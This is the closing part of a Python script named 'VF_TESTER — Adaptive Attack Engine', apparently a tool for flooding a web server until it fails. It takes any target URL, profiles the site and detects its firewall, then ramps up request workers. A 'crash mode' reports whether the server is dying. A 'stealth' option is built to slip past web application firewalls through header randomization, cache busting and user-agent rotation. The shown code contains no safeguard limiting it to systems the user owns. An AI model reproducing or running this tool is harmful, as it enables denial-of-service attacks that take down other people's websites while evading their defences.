    # Crash Mode Summary
    if tester.health_monitor.crash_mode_active:
        print(f"\n  +-- {C.BD}{C.R}Crash Mode{C.RS} --------------------------------------------+")
        print(f"  | Final Health: {tester.health_monitor.health_score:.0%}")
        print(f"  | Trend:        {tester.health_monitor.trend}")
        print(f"  | Server Dying: {'YES' if tester.health_monitor.server_dying else 'NO'}")
        print(f"  +---------------------------------------------------+")

    if st.codes:
        print(f"\n  +-- {C.BD}Status Codes{C.RS} -------------------------------------------+")
        for code in sorted(st.codes.keys()):
            count = st.codes[code]
            cc = C.G if code < 300 else C.Y if code < 500 else C.R
            print(f"  | {cc}{code}{C.RS}: {count:,} ({count/st.total*100:.1f}%)")
        print(f"  +---------------------------------------------------+")

    print(f"\n{'='*72}\n")


# ═══════════════════════════════════════════════════════════════════════════════
# CLI
# ═══════════════════════════════════════════════════════════════════════════════

def parse_args():
    p = argparse.ArgumentParser(
        description="VF_TESTER — Adaptive Attack Engine",
        formatter_class=argparse.RawDescriptionHelpFormatter)
    p.add_argument("--profile", default=None, help="VF_PROFILE.json from VF_FINDER")
    p.add_argument("--url", default=None, help="Target URL (auto-runs FINDER if no profile; will prompt if omitted)")
    p.add_argument("--max-workers", type=int, default=None, help="Override max workers")
    p.add_argument("--step", type=int, default=None, help="Override step size")
    p.add_argument("--stealth", action="store_true", help="Stealth mode: slow ramp, low workers, high delay, header randomization (anti-WAF)")
    p.add_argument("--crash-mode", action="store_true", help="Force crash mode")
    p.add_argument("--deep", action="store_true", help="Run FINDER with deep scan")
    p.add_argument("--dns", action="store_true", help="Run FINDER with DNS scan")
    return p.parse_args()


async def run_finder_first(url: str, deep: bool = False, dns: bool = False) -> str:
    """Run VF_FINDER first to generate profile, then return profile path"""
    print(f"\n  {C.CY}[VF] Running VF_FINDER first...{C.RS}")

    # Import and run FINDER inline
    from VF_FINDER import VFFinder
    finder = VFFinder(url, deep=deep, dns_scan=dns)
    profile = await finder.scan()

    # Save profile
    output_path = "VF_PROFILE.json"
    with open(output_path, 'w', encoding='utf-8') as f:
        json.dump(profile.to_dict(), f, ensure_ascii=False, indent=2)

    print(f"  {C.G}[VF] Profile saved to {output_path}{C.RS}")
    return output_path


async def main():
    args = parse_args()

    profile_path = args.profile

    # If no profile, run FINDER first
    if not profile_path:
        url = args.url
        if not url:
            # Interactive prompt — ask user for target URL
            print(f"\n{'='*72}")
            print(f"  {C.BD}{C.R}VF_TESTER — Adaptive Attack Engine{C.RS}")
            print(f"{'='*72}")
            url = input(f"  {C.CY}Enter target URL: {C.RS}").strip()
            if not url:
                print(f"  {C.R}[ERROR] No URL provided. Exiting.{C.RS}")
                return

        if not url.startswith("http"):
            url = "https://" + url

        profile_path = await run_finder_first(url, deep=args.deep, dns=args.dns)

    # Create tester with profile
    tester = VFTester(profile_path=profile_path)

    # Stealth mode — anti-WAF slow & low profile
    if args.stealth:
        tester.initial_workers = min(tester.initial_workers, 3)
        tester.max_workers = min(tester.max_workers, 500)
        tester.step = min(tester.step, 5)
        tester.step_duration = max(tester.step_duration, 15)
        tester.request_delay_ms = max(tester.request_delay_ms, 200)
        tester.enable_header_random = True
        print(f"  {C.CY}[STEALTH] Mode activated — low profile anti-WAF{C.RS}")
        print(f"  {C.CY}[STEALTH] Workers: {tester.initial_workers}->{tester.max_workers} | Step: +{tester.step} every {tester.step_duration}s | Delay: {tester.request_delay_ms}ms{C.RS}")
        print(f"  {C.CY}[STEALTH] Header randomization: ON | Cache bust: ON | UA rotation: ON{C.RS}")

    # Apply overrides
    if args.max_workers:
        tester.max_workers = args.max_workers
    if args.step:
        tester.step = args.step

    # Signal handlers (Unix only)
    if not IS_WINDOWS:
        try:
            loop = asyncio.get_event_loop()
            for sig in (signal.SIGINT, signal.SIGTERM):
                loop.add_signal_handler(sig, tester.stop)
        except Exception:
            pass

    # Print blank lines for TUI dashboard
    print(f"\n" * 13)

    try:
        await tester.run()
    except KeyboardInterrupt:
        tester.stop()
    except Exception as e:
        print(f"\n  {C.R}[ERROR] {e}{C.RS}")
    finally:
        await tester.keyboard.stop()
        report(tester.stats, tester.url, tester)

        # Save JSON report
        try:
            data = {
                "target": tester.url,
                "strategy": tester.attack.get("recommended_strategy"),
                "waf": tester.detected_waf,
                "cms": tester.detected_cms,
                "duration": tester.stats.dur,
                "total": tester.stats.total,
                "ok": tester.stats.ok,
                "fail": tester.stats.fail,
                "final_health": tester.health_monitor.health_score,
                "timeline": tester._snaps,
            }
            with open("VF_ATTACK_REPORT.json", "w", encoding="utf-8") as f:
                json.dump(data, f, ensure_ascii=False, indent=2)
        except Exception:
            pass


if __name__ == "__main__":
    asyncio.run(main())
